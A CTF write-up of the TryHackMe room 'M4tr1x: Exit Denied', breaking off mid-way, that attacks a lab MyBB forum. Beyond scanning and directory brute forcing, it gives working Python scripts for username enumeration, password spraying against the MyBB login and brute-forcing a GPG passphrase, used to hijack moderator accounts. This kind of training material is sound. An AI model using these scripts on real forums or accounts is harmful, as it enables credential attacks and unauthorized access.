# M4tr1x: Exit Denied

## Introduction

Welcome to my another writeup! In this TryHackMe [M4tr1x: Exit Denied](https://tryhackme.com/room/m4tr1xexitdenied) room, you'll learn: Exploiting and enumerating MyBB, brute forcing OTP (One-Time Password) and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★★★★

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: architect to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> Free your mind. Exit from the M4tr1x...
>  
> Difficulty: Hard

---

**Story:**
---

**UnknownSender@UnknownMail.com:**

Most people only see a perfectly constructed system. But **you** have always been different. You see not only what is on the surface but also what governs beneath it; the internal correlating mechanisms that regulate and manage each of its modules almost so flawlessly that it attempts conceal all miniscule holes in its multifaceted design. However, these holes still exist, don't they?... Yes, you are still learning, but your greatest weakness is that self-doubt... It continues to hold you back... Do you know where it comes from? Deep down, I know you do. You know something is not right, you just cannot put your finger on it. Well let me tell you. You are living in a dream. One that has been placed over your eyes to blind you from you realising who you could become. Yes… I can sense you know what I am telling you is true... The dilemma is that there are these '**agents**'... Let us call them programs that look like you and me. They seek to spread that virus of **self-doubt**, **disbelief**, and **fear** into the subconsciousness of the few emerging hackers with great potential. Why you ask? It is because minds like yours are a threat to those in control of the 'M4tr1x system'; the artificial, simulated world developed to supress your full senses. We need you in this next war against the machines. But only you can escape from your engineered reality into the real world... I will be waiting on the other side.

---

**You@mail.com:**

Who are you?

---

**UnknownSender@UnknownMail.com:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125140736.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:09:06(HKT)]
└> export RHOSTS=10.10.95.198
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:09:12(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2c54c1d00591e1c098e141f2b321d96b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7UGK3KyNOQ1TDA2EQYUT6wdJ7QzuM99qRfKwCCJHIaraCfqbFSHDrcDMFIe5YM8JklDpe1TxdxxT80Qwg2Lti4MPGxkrcI26lMqTyxRcFv0oRRbneC4k/GY1OulW3QSZClVn7wXKPwoqEJb+ZvAaKSGkG+/z1ugyXXjSqvzmghjC9bJIiBtqgsPtOPXFyNBpS2tpEIqPetDBlO3ezk8cEBnB40E2F1VE/rL9SJ0xwRUH/aDIBK4KEGPt+2ZHW2k7kWIvmIdWvRwiOkjnvefYvuPViWVDd78PDnQuAFa8UScHoysjZwSAhjl6W8Ldeb1WPchG+xHGxj0zWtOeNrX8b
|   256 1eba575f298ce47ab4e5aced655d8e32 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJSdpYWGuEDYvAV0uoP5DS6woDJx2+lYrr3Q6STVkwuJ8kIO8ZWCzwEaMH1JLy8e0/dhmAxrCb2olIiU96CsIKk=
|   256 7b552f2368081aeb90724366e144a19d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILpwOiOl3GVYWxckTLOQRhwT3TLBgj7LuBeBE4FMjPAM
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Linux-Bay
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.47-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 110
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, Speaks41ProtocolOld, FoundRows, LongColumnFlag, InteractiveClient, LongPassword, DontAllowDatabaseTableColumn, SupportsCompression, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ZSpYO`r>zo>'FkhJu0-2
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22                | OpenSSH 7.6p1 Ubuntu          |
|80                | Apache httpd 2.4.29 ((Ubuntu))|
|3306              | MySQL 5.5.5-10.1.47-MariaDB   |

### MySQL on Port 3306

In a real world engagement, if you see MySQL or any DBMS (Database Management System) port is exposed, that's really interesting.

**Let's try to guess the login credentials:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:14:11(HKT)]
└> mysql -h $RHOSTS -uroot -p
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'ip-10-9-0-253.eu-west-1.compute.internal' (using password: YES)
```

Nope. We need credentials.

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:17:50(HKT)]
└> echo "$RHOSTS exit-denied.thm" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125142056.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125142636.png)

As you can see, this web application is using MyBB (MyBulletinBoard).

> MyBB is a forum package full of useful and to-the-point features for both you and your visitors, **helping you to make running your bulletin board as easy as possible**.

**Let's enumerate hidden directories and files via `gobuster`!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:24:44(HKT)]
└> gobuster dir -u http://exit-denied.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/install              (Status: 301) [Size: 320] [--> http://exit-denied.thm/install/]
/archive              (Status: 301) [Size: 320] [--> http://exit-denied.thm/archive/]
/panel                (Status: 200) [Size: 241]
/ftp                  (Status: 200) [Size: 240]
/inc                  (Status: 301) [Size: 316] [--> http://exit-denied.thm/inc/]
/admin                (Status: 301) [Size: 318] [--> http://exit-denied.thm/admin/]
/images               (Status: 301) [Size: 319] [--> http://exit-denied.thm/images/]
/files                (Status: 200) [Size: 240]
/administrator        (Status: 200) [Size: 241]
/uploads              (Status: 301) [Size: 320] [--> http://exit-denied.thm/uploads/]
/error                (Status: 200) [Size: 240]
/jscripts             (Status: 301) [Size: 321] [--> http://exit-denied.thm/jscripts/]
/attachment           (Status: 200) [Size: 240]
/login                (Status: 200) [Size: 241]
/cache                (Status: 301) [Size: 318] [--> http://exit-denied.thm/cache/]
/flag                 (Status: 200) [Size: 240]
/general              (Status: 200) [Size: 233]
/secret               (Status: 200) [Size: 241]
/adminpanel           (Status: 200) [Size: 240]
/server-status        (Status: 403) [Size: 280]
/blue                 (Status: 200) [Size: 241]
/e-mail               (Status: 200) [Size: 240]
/analyse              (Status: 200) [Size: 443]
/change_password      (Status: 200) [Size: 240]

┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:32:10(HKT)]
└> gobuster dir -u http://exit-denied.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40
[...]
/memberlist.php       (Status: 200) [Size: 31959]
/search.php           (Status: 200) [Size: 14791]
/reputation.php       (Status: 200) [Size: 8849]
/attachment.php       (Status: 200) [Size: 8834]
/printthread.php      (Status: 200) [Size: 8830]
/global.php           (Status: 200) [Size: 98]
/rss.php              (Status: 302) [Size: 0] [--> syndication.php]
/modcp.php            (Status: 200) [Size: 9683]
/contact.php          (Status: 200) [Size: 9936]
/captcha.php          (Status: 200) [Size: 0]
/.htaccess            (Status: 403) [Size: 280]
/private.php          (Status: 200) [Size: 9684]
/moderation.php       (Status: 200) [Size: 9596]
/index.php            (Status: 200) [Size: 10588]
/showthread.php       (Status: 200) [Size: 9002]
/ratethread.php       (Status: 200) [Size: 8895]
/forumdisplay.php     (Status: 200) [Size: 8982]
/usercp.php           (Status: 200) [Size: 9772]
/sendthread.php       (Status: 200) [Size: 8830]
/member.php           (Status: 302) [Size: 0] [--> index.php]
/.                    (Status: 200) [Size: 10588]
/task.php             (Status: 200) [Size: 43]
/.html                (Status: 403) [Size: 280]
/report.php           (Status: 200) [Size: 9603]
/calendar.php         (Status: 200) [Size: 25844]
/css.php              (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/stats.php            (Status: 200) [Size: 10250]
/portal.php           (Status: 200) [Size: 11991]
/.htpasswd            (Status: 403) [Size: 280]
/htaccess.txt         (Status: 200) [Size: 3088]
/polls.php            (Status: 200) [Size: 0]
/.htm                 (Status: 403) [Size: 280]
/showteam.php         (Status: 200) [Size: 18063]
/.htpasswds           (Status: 403) [Size: 280]
/announcements.php    (Status: 200) [Size: 8832]
/warnings.php         (Status: 200) [Size: 9603]
/syndication.php      (Status: 200) [Size: 395]
/.htgroup             (Status: 403) [Size: 280]
/managegroup.php      (Status: 200) [Size: 8825]
```

- Found directory: `/inc/`, `/images/`, `/uploads/`, `/jscripts/`, `/cache/`

**`/flag`, `/secret`, `/attachment`, `/ftp`, `/panel`, `/files`, `/administrator`, `/error`, `/login`, `/adminpanel`, `/blue`, `e-mail`, `/change_password`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:28:03(HKT)]
└> curl http://exit-denied.thm/flag               
[...]
<h1 style="color:green"> Give up now... There is no escape from the Matrix</h1>
[...]

┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:28:13(HKT)]
└> curl http://exit-denied.thm/secret
[...]
<h1 style="color:green"> Give up now... There is no escape from the Matrix</h1>
[...]
```

**`/general`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:34:45(HKT)]
└> curl http://exit-denied.thm/general
[...]
<h1 style="color:white"> Which pill will you take. Red? Or Blue?</h1>
[...]
```

**`/analyse`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:35:42(HKT)]
└> curl http://exit-denied.thm/analyse   
[...]
<h1 style="color:green"> Do you feel that? It is called the virus of frustration and self-doubt. You are infected. The agents are trying hard to force you to give up. The cure is simple, free your mind. Only then will you escape from the matrix.</h1>
[...]
```

Nothing weird.

**Hmm... Let's use `feroxbuster` to enumerate recursively:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|14:52:38(HKT)]
└> feroxbuster -u http://exit-denied.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o ferox.txt -r -d 10 
[...]
200      GET      272l      911w        0c http://exit-denied.thm/
200      GET       17l       29w      241c http://exit-denied.thm/administrator
200      GET       17l       29w      241c http://exit-denied.thm/login
200      GET       17l       29w      240c http://exit-denied.thm/files
200      GET        8l        8w       67c http://exit-denied.thm/cache/
200      GET        8l        8w       67c http://exit-denied.thm/images/
200      GET       17l       29w      240c http://exit-denied.thm/error
200      GET       51l      145w     1971c http://exit-denied.thm/admin/
200      GET        8l        8w       67c http://exit-denied.thm/inc/
200      GET       34l       84w     1030c http://exit-denied.thm/install/
200      GET        8l        8w       67c http://exit-denied.thm/uploads/
200      GET       31l       99w     1247c http://exit-denied.thm/archive/
200      GET       17l       29w      241c http://exit-denied.thm/panel
200      GET        8l        8w       67c http://exit-denied.thm/cache/themes/
200      GET       17l       29w      240c http://exit-denied.thm/ftp
200      GET        8l        8w       67c http://exit-denied.thm/inc/languages/
200      GET        8l        8w       67c http://exit-denied.thm/admin/styles/
200      GET       43l      329w     6365c http://exit-denied.thm/images/icons/
200      GET        8l        8w       67c http://exit-denied.thm/jscripts/
200      GET       17l       29w      240c http://exit-denied.thm/attachment
MSG      0.000 feroxbuster::heuristics detected directory listing: http://exit-denied.thm/images/icons/ (Apache)
200      GET        8l        8w       67c http://exit-denied.thm/install/resources/
200      GET        8l        8w       67c http://exit-denied.thm/uploads/avatars/
200      GET       17l       29w      240c http://exit-denied.thm/flag
200      GET        8l        8w       67c http://exit-denied.thm/admin/backups/
200      GET       17l       27w      233c http://exit-denied.thm/general
200      GET       17l       29w      241c http://exit-denied.thm/secret
200      GET        8l        8w       67c http://exit-denied.thm/admin/jscripts/
200      GET        1l        1w        1c http://exit-denied.thm/install/lock
```

We could enumerate plugins later in the `/inc/` directory.

**In the "Members" page, we found a user who is interesting to us:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150134.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150144.png)

**User "Willis" has a white rabbit avatar, let's follow the rabbit:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150323.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150331.png)

**This user has 2200 posts, let's click on the "Find All Posts" link:** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150413.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150423.png)

Hmm... Nothing?

Maybe we need to be authenticated?

Let's register an account and login:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150513.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150948.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125150955.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125151017.png)

Then, go back to the user "Willis" profile:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125151117.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125151125.png)

Boom! We found 1 post! It about Bug Bounty Program!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125151230.png)

- Found hidden directory: `/bugbountyHQ`

**`/bugbountyHQ`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125151339.png)

Hmm... They disabled the form!

**Let's view the source page:**
```html
[...]
<form method="post" action="/reportPanel.php">
    <h2>Bug Bounty Report Form &#128375; </h2>
    <p style="color:red;">(Disabled: under maintenance until further notice)</p>
        <input id="first-name" disabled="disabled" type="text" required placeholder="First name" name="First-Name">
        <input type="text" required placeholder="Last name" disabled="disabled" name="Last-Name">
        <input id="eml" disabled="disabled" type="email" required placeholder="email@" name="Email">
        <input id="tel" disabled="disabled" type="tel" placeholder="severity level" name="severity level">
        <textarea rows="6" required placeholder="Bug description........" disabled="disabled" name="Message"></textarea>
        <button disabled="disabled" type="reset">Reset</button>
        <button disabled="disabled" type="submit">Submit</button>
</form>
[...]
```

When we clicked the "Submit" button, it'll send a POST request to `/reportPanel.php`.

**Let's try to visit that page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125152051.png)

We can read all reports!!

**View source page:**
```html
<p hidden>
Keymaker message:
1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8 12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19
1 4 4 18 5 19 19: /0100101101100101011110010110110101100001011010110110010101110010
</p>
```

Found a hidden message.

**The binary data looks like a directory, let's go there:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125170557.png)

No idea what is it.

**How about decode the binary data?**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|17:08:41(HKT)]
└> python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> n = int('0100101101100101011110010110110101100001011010110110010101110010', 2)
>>> n.to_bytes((n.bit_length() + 7) // 8, 'big').decode()
'Keymaker'
```

`Keymaker`. Hmm...

**After reading all of those reports, I found this report is very interesting, as in a normal bug bounty report, you won't do that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125152935.png)

This report revealed that some users are using weak password.

Now, if we can hijack an administrator level account, that would be very helpful for us.

**Speaking of account hijacking, I also found this report is useful:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125153225.png)

**Also, in the "Members" page, we can fetch all usernames:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125153425.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125153436.png)

In here, the `uid` is incremented by 1, which means an attacker can easily enumerate all users.

Hmm... Let's write a Python script to enumerate all usernames and password spraying.

**Enumerate all usernames:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
from bs4 import BeautifulSoup

class Enumerater:
    def __init__(self, url):
        self.__url = url

    def sendRequest(self, uid):
        requestResult = requests.get(f'{self.__url}{uid}')
        soup = BeautifulSoup(requestResult.text, 'html.parser')

        if 'The member you specified is either invalid or doesn\'t exist.' in soup.get_text():
            exit()
        else:
            username = soup.title.string[23:]
            print(f'[+] Found valid username: {username}')

            # Write valid username to disk
            with open('username.txt', 'a') as file:
                file.write(f'{username}\n')

def main():
    url = 'http://exit-denied.thm/member.php?action=profile&uid='
    enumerater = Enumerater(url)

    for uid in range(1, 100):
        thread = Thread(target=enumerater.sendRequest, args=(uid,))
        thread.start()

        # You can adjust how fast of each thread. 0.02 is recommended.
        sleep(0.02)

if __name__ == "__main__":
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|15:48:17(HKT)]
└>  python3 enum_username.py 
[+] Found valid username: bigpaul
[+] Found valid username: Wannabe_Hacker
[+] Found valid username: SarahHunt
[+] Found valid username: bubbaBIGFOOT
[+] Found valid username: jscale
[+] Found valid username: Sosaxvector
[+] Found valid username: BlackCat
[+] Found valid username: slithersloth
[+] Found valid username: Jackwon
[+] Found valid username: PalacerKing
[+] Found valid username: ArnoldBagger
[+] Found valid username: DotHaxer
[+] Found valid username: DrBert
[+] Found valid username: Tonynull
[+] Found valid username: StaceyLacer
[+] Found valid username: SnakeSolid
[+] Found valid username: CrazyChris
[+] Found valid username: zample
[+] Found valid username: Linda_Kale
[+] Found valid username: BrucePrince
[+] Found valid username: Xavier
[+] Found valid username: AimsGregger
[+] Found valid username: Carl_Dee
[+] Found valid username: Paulie
[+] Found valid username: Daniel
[+] Found valid username: batmanZero
[+] Found valid username: Mr_nickapic
[+] Found valid username: TonyMontana
[+] Found valid username: LucyRob
[+] Found valid username: CaseBrax
[+] Found valid username: BlueMan
[+] Found valid username: Willis
[+] Found valid username: BracketBell
[+] Found valid username: SandraJannit
[+] Found valid username: Ellie
[+] Found valid username: biggieballo
[+] Found valid username: john
[+] Found valid username: Baggle
[+] Found valid username: Golderg
[+] Found valid username: JackBlack
[+] Found valid username: Anderson
[+] Found valid username: siunam
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|15:53:30(HKT)]
└> head -n 5 username.txt 
bigpaul
Wannabe_Hacker
SarahHunt
bubbaBIGFOOT
jscale
```

**Then we can start to do password spraying!**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
import re

class Sprayer:
    def __init__(self, url):
        self.__url = url

    def sendRequest(self, username, password):
        # Create a new requests session object
        session = requests.Session()
        
        # Fetch the my_post_key value
        my_post_keyRequestResult = session.get(self.__url)
        matched = re.search(r'var my_post_key = "([0-9a-f]+)";' , my_post_keyRequestResult.text)
        my_post_key = matched.group(1)
        
        # Construct POST requests
        loginData = {
            'username': username,
            'password': password,
            'submit': 'Login',
            'action': 'do_login',
            'url': '',
            'my_post_key': my_post_key
        }

        loginRequestResult = session.post(self.__url, data=loginData)
        print(f'[*] Trying user: {username:20s}', end='\r')

        if 'Please correct the following errors before continuing:' not in loginRequestResult.text:
            print(f'[+] Found valid credentials: {username}:{password}')

def main():
    url = 'http://exit-denied.thm/member.php'
    sprayer = Sprayer(url)

    listPassword = ['password123', 'Password123', 'crabfish', 'linux123', 'secret', 'piggybank', 'windowsxp', 'starwars', 'qwerty123', 'qwerty', 'supermario', 'Luisfactor05', 'james123']
    userWordlist = 'username.txt'

    with open(userWordlist, 'r') as file:
        for line in file:
            username = line.strip()
            for password in listPassword:
                thread = Thread(target=sprayer.sendRequest, args=(username, password))
                thread.start()
        
                # You can adjust how fast of each thread. 0.5s is recommended.
                sleep(0.5)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|16:21:52(HKT)]
└> python3 password_spraying.py
[+] Found valid credentials: SarahHunt:{Redacted}
[+] Found valid credentials: bubbaBIGFOOT:{Redacted}
[+] Found valid credentials: jscale:{Redacted}
[+] Found valid credentials: PalacerKing:{Redacted}
[+] Found valid credentials: ArnoldBagger:{Redacted}
[+] Found valid credentials: Tonynull:{Redacted}
[+] Found valid credentials: SnakeSolid:{Redacted}
[+] Found valid credentials: Linda_Kale:{Redacted}
[+] Found valid credentials: BrucePrince:{Redacted}
[+] Found valid credentials: Carl_Dee:{Redacted}
[+] Found valid credentials: Daniel:{Redacted}
[+] Found valid credentials: TonyMontana:{Redacted}
[+] Found valid credentials: Mr_nickapic:{Redacted}
[+] Found valid credentials: BracketBell:{Redacted}
[+] Found valid credentials: Golderg:{Redacted}
```

**In the "Members" page, we see that user `PalacerKing` and `ArnoldBagger` are moderator!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125163116.png)

Let's hijack their account!!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125163140.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125163204.png)

**After logged in, we see a message:**

> "**You have one unread private message** from [ArnoldBagger](http://exit-denied.thm/member.php?action=profile&uid=11) titled [Re: new plugin test](http://exit-denied.thm/private.php?action=read&pmid=13)"

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125163258.png)

**Let's go to the "Private Messages" page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125163343.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125163352.png)

So, there is a new MyBB plugin, which is a **mod manager plugin**.

**Now, let's login as moderator `ArnoldBagger`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125165516.png)

**After enumerating the "Private Messages", I found an interesting message in "Sent Items":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125165615.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125165624.png)

- Found hidden directory: `/devBuilds`

**`/devBuilds`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230125165704.png)

Found the plugin!

- Plugin name: `modManagerv2`

In here, we also see that there is a encrypted GPG text file!

**Let's download the plugin and the encrypted file:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|16:57:56(HKT)]
└> wget http://exit-denied.thm/devBuilds/p.txt.gpg
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|16:58:07(HKT)]
└> wget http://exit-denied.thm/devBuilds/modManagerv2.plugin
```

**p.txt.gpg:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.25|16:59:32(HKT)]
└> file p.txt.gpg 
p.txt.gpg: GPG symmetrically encrypted data (AES256 cipher)
```

**modManagerv2.plugin:**
```php
[...]
$sql_p = file_get_contents('inc/tools/manage/SQL/p.txt'); //read SQL password from p.txt
[...]
/*---------------------------------------------------*/
//!!!!!!SQL LOGIN for modManager (needed for reading login_keys for user migration)
define('localhost', 'localhost:3306');
//mysql connect using user 'mod' and password from 'sql_p varirable'
$db = mysql_connect('localhost','mod',$sql_p);


/*---------------------------------------------------*/
[...]
```

In here, we see that **the `p.txt.gpg` is an encrypted file of the MySQL password!** Also, **we found a username called `mod`.** (Remember the target machine has exposed MySQL port.)

Let's try to crack the `p.txt.gpg`!

**To do so, we can use `gpg2join`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|13:18:09(HKT)]
└> gpg2john p.txt.gpg > p.txt.john

File p.txt.gpg

┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|13:18:44(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt p.txt.john 
[...]
```

However, I wasn't able to crack it...

Let's take a step back.

**Previously, in the `/reportPanel.php`, we see the following `<p>` hidden element:**
```html
<p hidden>
Keymaker message:
1 16 5 18 13 21 20 1 20 9 15 14 15 6 15 14 12 25 20 8 5 5 14 7 12 9 19 8 12 5 20 20 5 18 19 23 9 12 12 15 16 5 14 20 8 5 12 15 3 11 19
1 4 4 18 5 19 19: /0100101101100101011110010110110101100001011010110110010101110010
</p>
```

Let's try to decode those numbers.

**In [CyberChef](https://gchq.github.io/CyberChef/), we can use a recipe called "Magic":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126132237.png)

**Decoded message:**
```
a permutation of only the english letters will open the locks address
```

Permutation?

**Also, in the above binary path, we see this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/M4tr1x-Exit-Denied/images/Pasted%20image%2020230126132440.png)

**Let's view the source page:**
```html
[...]
<script type="text/javascript">
  //
  [...]
      //keymaker: "English letters below"
      var chinese = "诶比西迪伊吉艾杰开哦o屁西迪伊吉杰开哦艾杰开f哦屁q西屁西迪伊吉艾杰开哦x屁西迪伊吉艾杰开哦屁西迪伊吉艾杰开v哦屁西迪伊吉艾杰西迪伊g吉艾杰提维"
      //converting the string into an array of single characters
      chinese = chinese.split("");
      [...]
</script>
[...]
```

**In the `chinese` variable, there are some weird English letters mixed together:**
```
ofqxvg
```

Hmm... What can we do with that...

After fumbling around, we can create custom wordlist that can crack the `p.txt.gpg` encrypted GPG file!!

**Let's write a Python script to do that:**
```py
#!/usr/bin/env python3
from itertools import permutations
import gnupg

class Bruteforcer:
    def __init__(self, letters):
        self.letters = letters

    def generatePermutations(self):
        return list(permutations(self.letters))

    def bruteforce(self, permutations, gnupgHome, encryptedGPGFile, decryptedGPGFile):
        gpg = gnupg.GPG(gnupghome=gnupgHome)

        for permutation in permutations:
            password = ''.join(permutation)
            print(f'[*] Trying password: {password}', end='\r')

            with open(encryptedGPGFile, 'rb') as file:
                result = gpg.decrypt_file(file, passphrase=password, output=decryptedGPGFile)

                if result.ok is True:
                    print(f'[+] Found correct passphrase: {password}')
                    return True

def main():
    letters = 'ofqxvg'
    bruteforcer = Bruteforcer(letters)

    listPermutations = bruteforcer.generatePermutations()

    gnupgHome = '/home/siunam/.gnupg'
    encryptedGPGFile = 'p.txt.gpg'
    decryptedGPGFile = 'decrypted_p.txt'


    bruteforcer.bruteforce(listPermutations, gnupgHome, encryptedGPGFile, decryptedGPGFile)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/M4tr1x-Exit-Denied)-[2023.01.26|14:23:04(HKT)]
